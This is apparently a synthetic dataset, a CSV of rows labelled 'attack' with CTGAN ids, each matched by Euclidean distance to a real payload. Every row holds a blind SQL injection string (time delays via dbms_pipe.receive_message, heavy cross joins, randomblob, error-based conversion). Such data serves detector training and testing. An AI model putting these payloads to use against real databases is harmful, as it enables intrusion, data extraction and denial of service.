id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000029,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,8.506299085801999
CTGAN_000030,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,7.699336453510002
CTGAN_000031,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,6.906529779014952
CTGAN_000032,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,7.292224035879093
CTGAN_000033,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,7.852633668166719
CTGAN_000034,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,7.643212899579527
CTGAN_000035,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,6.580110939654454
CTGAN_000036,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,7.754447398269823
CTGAN_000037,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,6.3934043596265155
CTGAN_000038,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,7.8565813646970915
CTGAN_000039,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,9.04885114846375
CTGAN_000040,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,8.148699074480426
CTGAN_000041,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,10.964306482983261
CTGAN_000042,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,9.926339349267312
CTGAN_000043,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,6.670024838976115
CTGAN_000044,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,6.411528129234739
CTGAN_000045,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,9.433771330731028
CTGAN_000046,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,7.635099473456137
CTGAN_000047,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,10.632229369637944
CTGAN_000048,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,9.764018617234866
CTGAN_000049,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,6.466274949059339
CTGAN_000050,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,9.945162179938418
CTGAN_000051,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,7.017063911992856
CTGAN_000052,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,8.364643536399505
CTGAN_000053,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,8.481458341588429
CTGAN_000054,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,8.530267351769693
CTGAN_000055,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,7.502314196182329
CTGAN_000056,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,8.215918872417422
CTGAN_000057,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,7.9581686406551135
CTGAN_000058,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,8.224190927755537
CTGAN_000059,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,8.353330137119803
CTGAN_000060,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,8.20814626865861
CTGAN_000061,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,10.118664037114911
CTGAN_000062,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,8.979500660323101
CTGAN_000063,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,6.6014720834912755
CTGAN_000064,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,8.639757306200982
CTGAN_000065,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,8.628815117809504
CTGAN_000066,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,7.7821537206301254
CTGAN_000067,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,7.920129371293226
CTGAN_000068,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,8.326286249745921
CTGAN_000069,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,7.677705951565886
CTGAN_000070,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,7.68395546410263
CTGAN_000071,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,8.838133221937511
CTGAN_000072,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,6.796564096206131
CTGAN_000073,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,7.053952728582823
CTGAN_000074,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,8.131692156412347
CTGAN_000075,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,7.453964945019283
CTGAN_000076,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,8.631073962632087
CTGAN_000077,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,7.586378524101637
CTGAN_000078,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,8.671674941179203
CTGAN_000079,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,7.5877187160109
CTGAN_000080,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,6.035433924246474
CTGAN_000081,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,6.160945581609882
CTGAN_000082,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,8.477227806336955
CTGAN_000083,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,6.823896716128149
CTGAN_000084,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,6.930191735959251
CTGAN_000085,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,6.159867893085251
CTGAN_000086,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,6.743658721765885
CTGAN_000087,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,8.330754371564733
CTGAN_000088,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,8.959970428514392
CTGAN_000089,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,8.085075520434366
CTGAN_000090,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,7.339448516637686
CTGAN_000091,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,8.100372715538137
CTGAN_000092,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,7.413801424495122
CTGAN_000093,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,6.680056167018543
CTGAN_000094,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,8.056331253857268
CTGAN_000095,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,7.805627770314914
CTGAN_000096,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,8.725237840780537
CTGAN_000097,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000028,9.653769945474844
CTGAN_000098,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,7.949290264357863
CTGAN_000099,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,8.271732606949328
CTGAN_000100,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,8.838517404391109
CTGAN_000101,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,9.049282250275962
CTGAN_000102,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,5.378259380042984
CTGAN_000103,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,6.5165842754330585
CTGAN_000104,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,6.700440135739993
CTGAN_000105,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,6.668800045791997
CTGAN_000106,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,8.303432075397057
CTGAN_000107,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,7.78213848898701
CTGAN_000108,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000011,8.19349369510671
